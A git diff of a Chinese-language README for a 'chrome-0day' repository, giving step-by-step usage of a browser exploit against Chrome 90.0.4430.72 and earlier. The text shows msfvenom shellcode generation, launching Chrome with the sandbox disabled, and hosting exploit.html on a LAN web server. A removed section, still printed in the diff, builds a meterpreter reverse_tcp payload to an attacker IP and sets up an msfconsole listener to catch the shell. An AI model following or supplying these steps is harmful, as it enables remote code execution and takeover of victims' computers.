@@ -1,4 +1,11 @@
 # chrome-0day
+## 影响范围
+
+目前最新版也受影响
+小于等于90.0.4430.72 (正式版本)
+
+## 利用过程
+
 ### 生成shellcode代码
 
 #### 弹出计算器的shellcode生成命令：
@@ -29,8 +36,7 @@ msfvenom -a x86 -p windows/exec CMD="calc" EXITFUNC=thread -f num
 ```
 chrome.exe --no-sanbox /path/to/exploit.html
 ```
-![image](https://user-images.githubusercontent.com/41281045/115233357-617a7800-a14a-11eb-9221-1d6b9d96acfe.png)
-
+![image](https://user-images.githubusercontent.com/41281045/115233705-d0f06780-a14a-11eb-9f2e-ebf6e785b46f.png)
 
 #### 方式二
 
@@ -54,37 +60,14 @@ apache2
 sudo systemctl start apache2
 ```
 
-http://127.0.0.1/path/to/exploit.html
+http://192.168.43.232/exploit.html
 
-### 利用msf反弹shell
+![image](https://user-images.githubusercontent.com/41281045/115233623-b7e7b680-a14a-11eb-9fd0-49665bf58653.png)
 
-#### msf反弹shell的shenllcode生成命令：
 
-```msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.232 LPORT=5555 -e x86/shikata_ga_nai -b "\x00" -i 15 -f num -o payload.c```
-
-**注意：LHOST要和自己本机ip保持一致，LPORT要和接下来监听的端口也保持一致**
-
-将生成的payload.c文件中全部内容填入exploi.html中shellcode[]里。
-#### msfconsole监听
-
-执行命令：
-
-```
-msfconsole
-
-msf6>use exploit/multi/handler
-
-msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
-
-msf6 exploit(multi/handler) > set LHOST 192.168.43.232
-
-msf6 exploit(multi/handler) > set LPORT 5555
-
-msf6 exploit(multi/handler) > run
-
-```
 
 然后记得关闭沙盒后打开使用Chrome浏览器访问exploit.html即可成功反弹shell。
+
 
 
 ### 关闭沙盒方法：
